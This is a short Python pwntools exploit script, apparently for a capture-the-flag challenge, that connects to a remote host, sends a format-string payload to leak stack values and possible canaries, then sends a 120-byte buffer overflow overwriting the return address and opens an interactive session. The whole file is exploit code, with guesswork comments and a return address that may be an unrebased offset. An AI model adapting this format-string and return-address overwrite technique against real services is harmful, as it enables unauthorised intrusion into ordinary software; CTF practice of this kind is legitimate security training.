#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'
context.log_level = 'info'

host = 'blitzinstance1.ddns.net'
port = 33457

# Connect and leak with simple format string  
io = remote(host, port)
io.recvuntil(b'Type in your name below:')

# Simple leak - use %llx to get 64-bit values
payload = '%1$llx|%11$llx|%13$llx|%15$llx|%17$llx|%19$llx|%21$llx|%23$llx|%25$llx|%27$llx'
io.sendline(payload.encode())

data = io.recvuntil(b'Give your message of the day?').decode()
print(f"[*] Response:\n{data}")

# Extract leaks
leak_line = [l for l in data.split('\n') if '|' in l][0]
leaks = leak_line.split('Nice to meet you ')[-1].split('|')

print("\n[*] Leaked values:")
for i, leak in enumerate(leaks):
    try:
        val = int(leak, 16)
        if (val & 0xff) == 0 and val > 0x1000:
            print(f"Position {i}: {hex(val)} <- CANARY?")
        else:
            print(f"Position {i}: {hex(val)}")
    except:
        pass

# For this intro challenge, maybe the remote doesn't have canary/PIE?
# Let's just try blind buffer overflow

# Alternative: maybe we need to ret2plt or something else
# Let me check if there's a ROP gadget we need

# Build simple payload
offset = 120  # To return address
gift = 0x12a0

# Try with a ret gadget for stack alignment (common issue)
payload = b'A' * offset + p64(gift)

io.sendline(payload)
io.interactive()
